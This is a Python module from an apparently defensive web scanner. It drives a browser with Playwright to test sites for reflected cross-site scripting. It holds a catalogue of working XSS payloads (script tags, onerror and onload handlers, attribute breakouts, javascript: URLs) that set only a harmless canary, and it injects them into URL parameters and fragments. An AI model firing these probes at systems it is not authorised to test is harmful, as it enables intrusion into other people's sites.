"""Browser-driven XSS probe (Playwright).

Runs a small, deterministic catalogue of payloads against:

* URL query parameters declared via ``target.paths`` (``"/login?error=FUZZ"``)
* URL fragment (``#FUZZ``)
* Form fields detected on the base URL

Detection uses three signals:

1. ``window.__xss_fired`` canary triggered by our injected preload script
2. JS dialogs (``alert`` / ``confirm`` / ``prompt``) captured by Playwright
3. Uncontaminated reflection of the payload into the DOM

Because the check is browser-based, the target should have been loaded
interactively at least once so Playwright's persisted profile picks up any
session cookies. Otherwise only unauthenticated paths will be tested.
"""

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass
from typing import AsyncIterator
from urllib.parse import urlencode, urljoin, urlparse, parse_qsl

from argusai.core.check import Check, register
from argusai.core.context import Context
from argusai.core.finding import Finding, Severity
from argusai.core.target import Target


PAYLOADS: list[tuple[str, str]] = [
    ("classic_script", "<script>window.__xss_fired='script'</script>"),
    ("img_onerror", "\"><img src=x onerror=\"window.__xss_fired='img'\">"),
    ("svg_onload", "<svg/onload=\"window.__xss_fired='svg'\">"),
    ("attr_breakout", "\" autofocus onfocus=\"window.__xss_fired='attr'"),
    ("js_url", "javascript:window.__xss_fired='url'"),
    ("alert", "<script>alert('xss-%s')</script>"),
    ("html_comment_breakout", "--><script>window.__xss_fired='comment'</script><!--"),
]

CANARY_INIT = """
window.__xss_fired = false;
const __orig = window.alert;
window.alert = function(msg){ window.__xss_fired = 'alert:' + msg; return undefined; };
window.confirm = function(msg){ window.__xss_fired = 'confirm:' + msg; return true; };
window.prompt  = function(msg){ window.__xss_fired = 'prompt:' + msg; return 'x'; };
"""


@dataclass
class XSSResult:
    status: str  # TRIGGER / REFLECT / SAFE / ERROR
    signal: str = ""
    snippet: str = ""
    console_errors: list[str] = None  # type: ignore[assignment]


@register
class XSSCheck(Check):
    id = "xss"
    name = "XSS (browser)"
    description = "Launch Chrome and probe URL params / fragment / form fields."
    needs_browser = True
    order = 70

    async def run(
        self, target: Target, ctx: Context
    ) -> AsyncIterator[Finding]:
        try:
            browser_ctx = await ctx.browser_context()
        except Exception as e:
            ctx.log(f"xss: browser unavailable ({e}); skipping", level="warn")
            return

        injection_urls = _injection_urls(target, ctx)
        if not injection_urls:
            ctx.log("xss: no injection targets found; skipping")
            return

        observe = ctx.settings.xss_observe_delay_ms > 0
        concurrency = 1 if observe else max(2, min(4, ctx.settings.http_concurrency))
        sem = asyncio.Semaphore(concurrency)
        ctx.log(f"xss: will probe {len(injection_urls)} URLs (concurrency={concurrency})")
        for url_template in injection_urls:
            probes = []
            for label, payload in PAYLOADS:
                probe_payload = payload % ("T" + label) if "%s" in payload else payload
                test_url = url_template.replace("FUZZ", probe_payload)
                ctx.log(f"xss: probing {label} -> {test_url[:180]}")
                probes.append(
                    _limited_probe(
                        sem,
                        label,
                        browser_ctx,
                        test_url,
                        probe_payload,
                        observe_delay_ms=ctx.settings.xss_observe_delay_ms,
                    )
                )

            results = await asyncio.gather(*probes)
            triggered = False
            for label, probe_payload, test_url, result in results:
                ctx.log(f"xss: {label} => {result.status.lower()} {result.signal or ''}".strip())
                if result.status == "TRIGGER":
                    triggered = True
                    yield Finding(
                        id=f"xss.{label}",
                        category="xss",
                        severity=Severity.HIGH,
                        title=f"XSS triggered via {label} at {url_template}",
                        url=test_url,
                        description=(
                            "A payload injected into the URL was executed in the "
                            "browser — indicating reflected cross-site scripting."
                        ),
                        evidence={
                            "payload": probe_payload,
                            "signal": result.signal,
                            "template": url_template,
                            "console": result.console_errors or [],
                        },
                        remediation=(
                            "Escape user input when rendering into HTML/JS contexts. "
                            "Prefer a templating framework with automatic context-aware "
                            "escaping and add CSP as defence in depth."
                        ),
                        cwe="CWE-79",
                    )
                elif result.status == "REFLECT":
                    yield Finding(
                        id=f"xss.reflect.{label}",
                        category="xss",
                        severity=Severity.LOW,
                        title=f"Payload reflected (no execution) at {url_template}",
                        url=test_url,
                        description=(
                            "The payload was reflected into the page body but did not "
                            "execute. This is not a direct XSS but warrants a review of "
                            "the surrounding sanitisation."
                        ),
                        evidence={
                            "payload": probe_payload,
                            "snippet": result.snippet,
                        },
                    )
            if triggered:
                ctx.log(f"xss: execution confirmed for {url_template}")


def _injection_urls(target: Target, ctx: Context) -> list[str]:
    urls: list[str] = []
    # Explicit templates from target config
    for p in target.paths:
        if "FUZZ" in p:
            urls.append(urljoin(target.origin + "/", p.lstrip("/")))
    # Hash injection on base + login
    for base in (target.url, urljoin(target.origin + "/", "login")):
        urls.append(base + "#FUZZ")
        urls.append(base + "?msg=FUZZ")
        urls.append(base + "?error=FUZZ")
        urls.append(base + "?redirect=FUZZ")
    return list(dict.fromkeys(urls))


async def _limited_probe(
    sem: asyncio.Semaphore,
    label: str,
    browser_ctx,
    url: str,
    payload: str,
    observe_delay_ms: int = 0,
):
    async with sem:
        result = await _probe(browser_ctx, url, payload, observe_delay_ms=observe_delay_ms)
        return label, payload, url, result


async def _probe(browser_ctx, url: str, payload: str, observe_delay_ms: int = 0) -> XSSResult:
    from playwright.async_api import Error as PwError

    page = await browser_ctx.new_page()
    if observe_delay_ms > 0:
        try:
            await page.bring_to_front()
        except Exception:
            pass
    console: list[str] = []
    page.on("console", lambda m: console.append(f"{m.type}:{m.text}"[:200]))
    triggered_dialog: list[str] = []
    page.on(
        "dialog",
        lambda d: asyncio.ensure_future(_handle_dialog(d, triggered_dialog)),
    )
    try:
        await page.add_init_script(CANARY_INIT)
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=8000)
        except PwError as e:
            # Page might still have navigated and fired a canary — check dialogs.
            if triggered_dialog:
                return XSSResult(status="TRIGGER", signal=f"dialog={triggered_dialog[0]}")
            return XSSResult(status="ERROR", signal=str(e))
        # Give SPAs a short beat; visible observation can request a longer delay.
        await page.wait_for_timeout(observe_delay_ms if observe_delay_ms > 0 else 150)
        try:
            await page.wait_for_load_state("domcontentloaded", timeout=3000)
        except PwError:
            pass

        fired = await _safe_evaluate(page, "() => window.__xss_fired")
        if fired:
            if observe_delay_ms > 0:
                await page.wait_for_timeout(observe_delay_ms)
            return XSSResult(status="TRIGGER", signal=f"canary={fired}")
        if triggered_dialog:
            if observe_delay_ms > 0:
                await page.wait_for_timeout(observe_delay_ms)
            return XSSResult(status="TRIGGER", signal=f"dialog={triggered_dialog[0]}")

        html = await _safe_content(page)
        if html is None:
            # Page was destroyed / navigated to chrome-error / etc. — treat as safe
            # unless we already caught a dialog above.
            return XSSResult(
                status="SAFE",
                signal="context-destroyed",
                console_errors=console[:10],
            )
        if payload in html:
            m = re.search(re.escape(payload), html)
            s = max(0, m.start() - 80)
            e = min(len(html), m.end() + 80)
            if observe_delay_ms > 0:
                await page.wait_for_timeout(observe_delay_ms)
            return XSSResult(status="REFLECT", snippet=html[s:e])
        if observe_delay_ms > 0:
            await page.wait_for_timeout(observe_delay_ms)
        return XSSResult(status="SAFE", console_errors=console[:10])
    finally:
        try:
            await page.close()
        except Exception:
            pass


async def _safe_evaluate(page, script: str, retries: int = 2):
    """page.evaluate wrapped so a mid-flight navigation doesn't abort the check."""
    from playwright.async_api import Error as PwError

    for attempt in range(retries + 1):
        try:
            return await page.evaluate(script)
        except PwError as e:
            msg = str(e)
            if "Execution context was destroyed" in msg and attempt < retries:
                # Wait for the new context to settle, then try again.
                try:
                    await page.wait_for_load_state("domcontentloaded", timeout=2000)
                except PwError:
                    pass
                await page.wait_for_timeout(200)
                continue
            return None
    return None


async def _safe_content(page) -> str | None:
    from playwright.async_api import Error as PwError

    try:
        return await page.content()
    except PwError:
        return None


async def _handle_dialog(dialog, sink: list[str]) -> None:
    sink.append(f"{dialog.type}:{dialog.message}")
    try:
        await dialog.dismiss()
    except Exception:
        pass
